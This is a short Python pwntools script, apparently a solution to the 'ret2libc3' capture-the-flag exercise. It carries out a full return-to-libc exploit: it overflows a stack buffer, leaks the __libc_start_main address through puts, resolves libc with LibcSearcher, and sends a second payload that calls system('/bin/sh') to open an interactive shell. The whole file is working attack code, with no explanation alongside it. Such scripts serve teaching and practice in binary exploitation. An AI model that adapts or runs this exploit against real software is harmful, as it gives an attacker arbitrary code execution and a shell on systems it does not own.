from pwn import *
from LibcSearcher import LibcSearcher

elf_ret2libc3 = ELF('./ret2libc3')

sh = process('./ret2libc3')

plt_puts = elf_ret2libc3.plt['puts']
got_libc_start_main = elf_ret2libc3.got['__libc_start_main']
addr_main = elf_ret2libc3.symbols['main']
offset = 0x6c + 4

payload = flat([b'a' * offset, plt_puts, addr_main, got_libc_start_main])
sh.sendlineafter('Can you find it !?', payload)
libc_start_main_addr = u32(sh.recv(4))

print('libc_start_main_addr: ' + hex(libc_start_main_addr))

libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

print("get shell")
payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)

sh.interactive()